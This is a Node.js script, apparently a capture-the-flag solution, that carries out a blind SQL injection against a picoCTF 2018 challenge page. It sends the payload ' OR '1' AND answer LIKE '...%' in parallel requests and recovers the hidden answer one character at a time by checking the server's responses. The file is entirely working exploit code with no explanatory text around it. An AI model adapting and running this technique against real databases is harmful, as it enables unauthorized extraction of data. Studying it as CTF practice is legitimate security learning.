const fetch = require("node-fetch");
const {URLSearchParams} = require("url");

let soFar = `' OR '1' AND answer LIKE '`;

const chars = "abcdefghijklmnopqrstuvwxyz1234567890".toUpperCase().split("");

const URL = "http://2018shell1.picoctf.com:28120/answer2.php";

async function next() {
    await Promise.all(chars.map(char => {

        const params = new URLSearchParams();
        params.append("answer", `${soFar}${char}%`);
        params.append("debug", 1);
    
        return fetch(URL, {
            method: "POST",
            body: params
        }).then(res => res.text()).then(text => {
    
            if (text.includes("close")) {
                soFar += char;
            }
        });
    }));
    console.log("Currently we have...", soFar);
    next();
}

next();
